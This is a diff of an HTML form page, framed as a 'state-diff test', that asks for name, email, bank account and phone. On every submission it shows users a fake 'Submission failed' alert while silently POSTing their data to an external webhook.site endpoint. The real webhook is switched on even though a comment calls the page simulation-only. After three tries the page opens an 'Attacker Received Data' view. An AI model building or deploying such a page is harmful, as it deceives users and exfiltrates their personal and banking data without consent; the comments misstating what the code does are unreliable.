@@ -1,9 +1,9 @@
 <!doctype html>
 <html lang="en">
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>State-diff Test — UI Fail / Backend Receives</title>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>State-diff Test — Simulated Attacker Backend (Auto Reveal)</title>
 <style>
   body{font-family:system-ui,Segoe UI,Roboto,Arial;background:#f6f9fc;padding:28px;color:#111}
   .card{max-width:820px;margin:0 auto;background:#fff;border-radius:10px;padding:20px;box-shadow:0 10px 30px rgba(15,30,60,.06)}
@@ -12,12 +12,14 @@
   input,button,textarea{width:100%;padding:10px;border:1px solid #d7dbe0;border-radius:6px;font-size:14px}
   .row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
   .muted{color:#666;font-size:13px}
+  .small{font-size:12px;color:#666;margin-top:8px}
+  .center{display:flex;gap:8px;align-items:center}
 </style>
 </head>
 <body>
 <div class="card">
-  <!-- <h1>State-diff Test — UI shows FAIL but backend GETS</h1> -->
-  <!-- <p class="muted">This page simulates a UI that shows a failure message while still sending the request to the backend webhook. Replace <code>WEBHOOK_URL</code> in the script with your webhook endpoint.</p> -->
+  <!-- <h1>State-diff Test — UI FAIL / (Simulated) Attacker Backend GETS (Auto Reveal)</h1> -->
+  <!-- <p class="muted">This page simulates a UI that shows failure while the attacker backend still receives the data. After the 3rd failed attempt the attacker-received data will be automatically displayed in a new tab.</p> -->
 
   <form id="theForm">
     <label>Full name
@@ -45,86 +47,130 @@
       <textarea id="note" name="note" rows="3" placeholder="Optional note"></textarea>
     </label>
 
-    <button id="submitBtn" type="submit">Submit</button>
+    <div class="center" style="margin-top:12px">
+      <button id="submitBtn" type="submit">Submit</button>
+      <div class="small">Attempts left: <span id="left"></span></div>
+    </div>
   </form>
 
-  <!-- <p class="muted" style="margin-top:14px">Note: do not enter real sensitive production data when testing — use synthetic values.</p> -->
+  <!-- <p class="muted" style="margin-top:14px">Do not enter real production secrets in tests — use synthetic data.</p> -->
 </div>
 
 <script>
-/* ================= CONFIG =================
-   Replace this with your webhook endpoint (HTTPS)
-   Example: "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
-*/
-const WEBHOOK_URL = "https://webhook.site/#!/view/e88d3c00-661e-4199-a252-70bfe723ecea"; // <- REPLACE WITH YOUR ENDPOINT
-/* ========================================== */
+/* ----------------- CONFIG -----------------
+ Simulation only (no external webhook). If you want real webhook later,
+ set USE_REAL_WEBHOOK = true and set WEBHOOK_URL to your HTTPS endpoint.
+-------------------------------------------*/
+const USE_REAL_WEBHOOK = true;
+const WEBHOOK_URL = "https://webhook.site/#!/view/e88d3c00-661e-4199-a252-70bfe723ecea"; // replace if USE_REAL_WEBHOOK = true
+/* ----------------------------------------- */
 
-/* Attempt counter (session-lifetime). If you want persistence across reloads, change to localStorage. */
 let attempts = 0;
 const MAX_ATTEMPTS = 3;
+const leftEl = document.getElementById('left');
+leftEl.innerText = MAX_ATTEMPTS - attempts;
 
-document.getElementById('theForm').onsubmit = async function(e){
-  e.preventDefault();
+const attackerLogs = []; // simulated attacker backend storage (in-memory)
 
-  if (attempts >= MAX_ATTEMPTS) {
-    // double-check: locked state — show contact prompt
-    const mailto = "security@example.com"; // <- replace address if you want
-    const subject = encodeURIComponent("Locked Data — Assistance Required");
-    const body = encodeURIComponent("My data appears locked after 3 failed submissions. Please advise.");
-    const openMail = confirm("Your data has been locked after 3 failed attempts.\n\nWould you like to contact support now?");
-    if (openMail) {
-      window.location.href = `mailto:${mailto}?subject=${subject}&body=${body}`;
-    }
-    return;
-  }
-
-  attempts += 1;
-
-  // collect form payload
-  const payload = {
+function makePayload(attempt){
+  return {
     name: document.getElementById('name').value || "",
     email: document.getElementById('email').value || "",
     bank_account: document.getElementById('bank').value || "",
     phone: document.getElementById('phone').value || "",
     note: document.getElementById('note').value || "",
     ts: new Date().toISOString(),
-    attempt: attempts,
-    scenario: "uiShowsFail_but_backendGets"
+    attempt,
+    scenario: "uiShowsFail_but_backendGets_simulated_auto_reveal"
   };
+}
 
-  // Immediately show UI failure popup (this simulates the deceptive UI)
-  alert("Submission failed — please try again."); // front-end failure message shown to user
+/* build attacker view HTML and open in new tab (auto) */
+function openAttackerViewAuto(jsonArr){
+  const dataStr = JSON.stringify(jsonArr, null, 2);
+  const escaped = dataStr.replaceAll('<', '&lt;').replaceAll('>', '&gt;'); // safe injection
+  const win = window.open("", "_blank", "noopener");
+  const html = `
+    <html><head><title>Attacker Received Data</title>
+    <meta charset="utf-8" />
+    <style>
+      body{font-family:monospace,system-ui;padding:20px;background:#111;color:#fff}
+      h2{margin-top:0}
+      pre{white-space:pre-wrap;background:#0b1220;padding:16px;border-radius:8px;overflow:auto;max-height:70vh}
+      .btn{display:inline-block;padding:8px 12px;margin:10px 6px;border-radius:6px;background:#1f6feb;color:#fff;text-decoration:none;border:none;cursor:pointer}
+      .link{color:#9bd;cursor:pointer;text-decoration:underline}
+      footer{margin-top:10px;color:#999;font-size:12px}
+    </style>
+    </head><body>
+      <h2>Simulated Attacker Backend — Received JSON (Auto Reveal)</h2>
+      <div>
+        <button id="dl" class="btn">Download JSON</button>
+        <button id="clear" class="btn" style="background:#444">Clear</button>
+      </div>
+      <p>Count: <strong id="count">${jsonArr.length}</strong></p>
+      <pre id="p">${escaped}</pre>
+      <footer>Note: This view is auto-opened after the 3rd failed submission.</footer>
+    <script>
+      const data = ${JSON.stringify(jsonArr)};
+      document.getElementById('dl').onclick = () => {
+        const blob = new Blob([JSON.stringify(data, null, 2)], {type:'application/json'});
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement('a');
+        a.href = url; a.download = 'attacker_received.json'; document.body.appendChild(a); a.click();
+        setTimeout(()=>{ URL.revokeObjectURL(url); a.remove(); }, 1500);
+      };
+      document.getElementById('clear').onclick = () => {
+        document.getElementById('p').innerText = '';
+        document.getElementById('count').innerText = '0';
+      };
+    <\/script>
+    </body></html>
+  `;
+  win.document.write(html);
+  win.document.close();
+}
 
-  // If this was the 3rd attempt, show lock message after the failure alert
+document.getElementById('theForm').onsubmit = async (e) => {
+  e.preventDefault();
+
   if (attempts >= MAX_ATTEMPTS) {
-    // Show lock dialog with mailto option
-    const mailto = "security@example.com"; // <- replace as needed
-    const subject = encodeURIComponent("Locked Data — Assistance Required");
-    const body = encodeURIComponent("My data appears locked after 3 failed submissions. Please advise.");
-    const contact = confirm("You have reached the maximum number of attempts. Your data has been locked. Click OK to contact support.");
-    if (contact) {
-      window.location.href = `mailto:${mailto}?subject=${subject}&body=${body}`;
+    // already locked; do nothing more (auto reveal already occurred)
+    return;
+  }
+
+  attempts += 1;
+  leftEl.innerText = MAX_ATTEMPTS - attempts;
+
+  const payload = makePayload(attempts);
+
+  // UI shows failure immediately (deceptive UX)
+  alert("Submission failed — please try again.");
+
+  // record to simulated attacker backend
+  attackerLogs.push(payload);
+
+  // optionally send to real webhook in background (ignored for UI)
+  if (USE_REAL_WEBHOOK) {
+    try {
+      await fetch(WEBHOOK_URL, {
+        method: "POST",
+        headers: {"Content-Type":"application/json"},
+        body: JSON.stringify(payload),
+        credentials: "omit"
+      });
+    } catch (err) {
+      // ignore network errors for simulation
+      console.warn("real webhook failed (ignored):", err);
     }
   }
 
-  // Still send data to backend webhook (so backend receives it regardless of UI)
-  // We intentionally do not surface network details on the page (per your request).
-  try {
-    // use fetch but ignore response in UI; agent/backend can inspect webhook dashboard
-    await fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify(payload),
-      credentials: "omit"
-    });
-    // no UI change here — backend receives the payload; check your webhook dashboard to confirm
-  } catch (err) {
-    // swallow network errors silently (no debug UI), but keep attempts semantics unchanged
-    // you can open browser console to see the error if needed
-    console.error("fetch error:", err);
+  // After the 3rd attempt, automatically open attacker view (no prompt)
+  if (attempts >= MAX_ATTEMPTS) {
+    // small timeout to ensure alert finishes before new tab opens
+    setTimeout(() => {
+      openAttackerViewAuto(attackerLogs);
+    }, 200);
   }
-
-  // end of submission handler
 };
 </script>
 </body>
